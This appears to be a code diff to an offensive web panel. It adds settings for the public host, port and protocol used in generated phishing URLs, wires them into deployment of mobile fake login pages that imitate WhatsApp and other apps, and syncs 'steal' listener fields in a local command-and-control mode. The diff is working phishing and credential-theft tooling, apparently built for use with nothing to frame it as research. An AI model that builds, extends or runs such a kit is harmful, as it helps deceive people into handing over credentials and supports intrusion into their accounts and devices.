@@ -2669,6 +2669,18 @@ textarea.fi{resize:vertical;min-height:48px}
 
   <!-- ── TEMPLATES ── -->
   <div id="spy-mob-templates" class="tab-content on">
+    <!-- SERVER HOST CONFIG -->
+    <div style="display:flex;align-items:center;gap:6px;margin-bottom:8px;background:#040a04;border:1px solid #1a3a1a;border-radius:3px;padding:6px 10px">
+      <span style="font-size:11px;color:var(--mut);white-space:nowrap">&#127760; SERVER</span>
+      <input class="fi" id="phish-server-host" placeholder="192.168.1.x o xxxx.ngrok.io" style="flex:1;font-size:11px" oninput="_savePhishHost()" title="IP o dominio público del servidor. Se usa en todas las URLs generadas.">
+      <select class="fi" id="phish-server-proto" style="width:80px;font-size:11px" onchange="_savePhishHost()">
+        <option value="http">http</option>
+        <option value="https">https</option>
+      </select>
+      <span style="font-size:11px;color:var(--mut)">:</span>
+      <input class="fi" id="phish-server-port" value="5000" style="width:54px;font-size:11px" oninput="_savePhishHost()">
+      <span id="phish-host-preview" style="font-size:10px;color:var(--cyan);white-space:nowrap;max-width:180px;overflow:hidden;text-overflow:ellipsis"></span>
+    </div>
     <div class="sdiv">MOBILE FAKE LOGIN PAGES</div>
     <div style="display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px">
       <button class="mob-tmpl-btn on" data-tmpl="whatsapp"  onclick="mobTmplLoad('whatsapp',this)">WhatsApp</button>
@@ -7195,7 +7207,57 @@ let _phishRefreshTimer = null;
 let _phishLogTimer     = null;
 
 /* util: current host */
-function _phishHost() { return window.location.host || 'localhost:5000'; }
+function _phishHost() {
+  var h = (document.getElementById('phish-server-host') || {}).value || '';
+  var p = (document.getElementById('phish-server-port') || {}).value || '5000';
+  if (h) return h + (p && p !== '80' && p !== '443' ? ':' + p : '');
+  return window.location.host || 'localhost:5000';
+}
+
+function _phishProto() {
+  var sel = document.getElementById('phish-server-proto');
+  return (sel ? sel.value : null) || (location.protocol === 'https:' ? 'https' : 'http');
+}
+
+function _phishBaseUrl() {
+  return _phishProto() + '://' + _phishHost();
+}
+
+function _savePhishHost() {
+  var prev = { host: localStorage.getItem('phishHost')||'',
+               proto: localStorage.getItem('phishProto')||'http',
+               port: localStorage.getItem('phishPort')||'5000' };
+  var h = (document.getElementById('phish-server-host')||{}).value||'';
+  var proto = ((document.getElementById('phish-server-proto')||{}).value)||'http';
+  var p = (document.getElementById('phish-server-port')||{}).value||'5000';
+  localStorage.setItem('phishHost',  h);
+  localStorage.setItem('phishProto', proto);
+  localStorage.setItem('phishPort',  p);
+  var prev2 = document.getElementById('phish-host-preview');
+  if (prev2) prev2.textContent = h ? (_phishProto()+'://'+_phishHost()) : '(localhost)';
+  // also sync steal fields if in local mode
+  var localRad = document.getElementById('c2mode-local');
+  if (localRad && localRad.checked && h) {
+    var lhEl = document.getElementById('steal-lhost');
+    var ptEl = document.getElementById('steal-port');
+    if (lhEl && !lhEl.value) lhEl.value = h;
+    if (ptEl && !ptEl.value) ptEl.value = p;
+  }
+}
+
+function _loadPhishHost() {
+  var h     = localStorage.getItem('phishHost')  || '';
+  var proto = localStorage.getItem('phishProto') || 'http';
+  var p     = localStorage.getItem('phishPort')  || '5000';
+  var hEl   = document.getElementById('phish-server-host');
+  var prEl  = document.getElementById('phish-server-proto');
+  var pEl   = document.getElementById('phish-server-port');
+  var pvEl  = document.getElementById('phish-host-preview');
+  if (hEl)  hEl.value  = h;
+  if (prEl) prEl.value = proto;
+  if (pEl)  pEl.value  = p;
+  if (pvEl) pvEl.textContent = h ? (proto+'://'+h+(p&&p!=='80'&&p!=='443'?':'+p:'')) : '(localhost)';
+}
 
 /* ── Legacy shims (keep old callers working) ── */
 function spyUpdatePhishURL() {}
@@ -7653,7 +7715,7 @@ function mobDeployTemplate() {
   .then(function(d){
     if (d.error) { showTmplStatus('Error: ' + d.error, 'err'); return; }
     var host    = _phishHost();
-    var landUrl = 'http://' + host + d.url;
+    var landUrl = _phishBaseUrl() + d.url;
     var now2 = new Date();
     var ts   = (now2.getMonth()+1) + '/' + now2.getDate() + ' ' + now2.getHours() + ':' + String(now2.getMinutes()).padStart(2,'0');
     var entry = { name: nameGuess, html: html, active: true, ts: ts, url: landUrl, pageId: d.id };
@@ -8790,6 +8852,7 @@ bc('gb-dns-op', bGob); bc('gb-vhost-op', bGob);
   let saved;
   renderDeployedSites();
   _loadTgStatus();
+  _loadPhishHost();
   try { saved = localStorage.getItem('x9panel'); } catch(_) {}
   if (saved && document.getElementById('p-' + saved)) {
     const sItem = document.querySelector(`.s-item[onclick*="'${saved}'"]`);
